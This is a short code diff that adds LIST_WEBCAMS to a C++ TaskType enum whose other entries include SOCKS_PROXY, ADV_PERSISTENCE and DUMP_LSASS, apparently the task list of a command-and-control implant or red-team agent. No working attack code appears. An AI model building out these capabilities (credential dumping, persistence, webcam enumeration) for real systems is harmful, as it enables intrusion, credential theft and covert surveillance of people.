@@ -28,6 +28,7 @@ enum class TaskType {
     SOCKS_PROXY,
     ADV_PERSISTENCE,
     DUMP_LSASS,
+    LIST_WEBCAMS,
     UNKNOWN // For tasks that don't map to a known type
 };
 
